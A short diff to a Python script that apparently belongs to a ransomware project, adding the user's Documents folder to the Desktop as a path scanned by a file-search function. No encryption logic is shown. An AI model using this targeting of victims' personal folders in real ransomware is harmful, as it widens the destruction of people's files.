@@ -107,8 +107,10 @@ def searchDecFile(path):
 
 user = os.getenv("USERNAME")
 startPath = 'C:\\Users\\' + user + '\\Desktop\\*'
+documentPath = 'C:\\Users\\' + user + '\\Documents\\*'
 #startPath = 'C:\\Users\\Yeeun\\Desktop\\Ransom_Private\\Ransom\\test\\*'
 keyPath = 'C:\\Users\\' + user + '\\'
 print(glob.glob(startPath, recursive=True))
 
 searchDecFile(startPath)
+searchDecFile(documentPath)
